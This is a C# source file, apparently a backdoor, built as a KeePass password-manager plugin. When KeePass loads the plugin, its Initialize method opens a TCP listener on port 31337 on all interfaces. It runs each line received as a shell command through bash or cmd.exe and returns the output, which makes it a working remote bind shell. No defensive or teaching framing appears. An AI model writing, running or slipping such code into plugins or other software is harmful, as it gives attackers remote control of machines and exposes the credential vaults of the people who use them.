using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using KeePass.Plugins;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace backdoor_keepass
{
    public sealed class SamplePluginExt : Plugin
    {

        public static bool IsLinux
        {
            get
            {
                int p = (int)Environment.OSVersion.Platform;
                return (p == 4) || (p == 6) || (p == 128);
            }
        }
        public override bool Initialize(IPluginHost host)
        {

            int PortNo = 31337;
            TcpListener servListener;
            servListener = new TcpListener(IPAddress.Any, PortNo);
            servListener.Start();
            while (true)
            {
                Socket rocksock = servListener.AcceptSocket();
                try
                {
                    Stream dastream = new NetworkStream(rocksock);
                    StreamReader sr = new StreamReader(dastream);
                    StreamWriter sw = new StreamWriter(dastream);
                    sw.AutoFlush = true;
                    sw.WriteLine("AverageJoe's C# TCP Shell!!");
                    while (true)
                    {
                        string command = sr.ReadLine();
                        if (command == "" || command == null)
                        {
                            sw.WriteLine("Command not entered!");
                            break;
                        }
                        System.Diagnostics.Process kek = new System.Diagnostics.Process();
                        if (IsLinux)
                        {
                            kek.StartInfo.FileName = "/bin/bash";
                            kek.StartInfo.Arguments = "-c " + command;
                        }
                        else
                        {
                            kek.StartInfo.FileName = "cmd.exe";
                            kek.StartInfo.Arguments = "/c " + command;
                        }
                        kek.StartInfo.RedirectStandardOutput = true;
                        kek.StartInfo.UseShellExecute = false;
                        kek.Start();
                        sw.WriteLine("entered command {0}", command);
                        sw.WriteLine("output: {0}", kek.StandardOutput.ReadToEnd());
                    }
                    dastream.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
                rocksock.Close();
            }

            Terminate();

            return true;
        }
        public override void Terminate()
        {
            
            
        }
    }
}
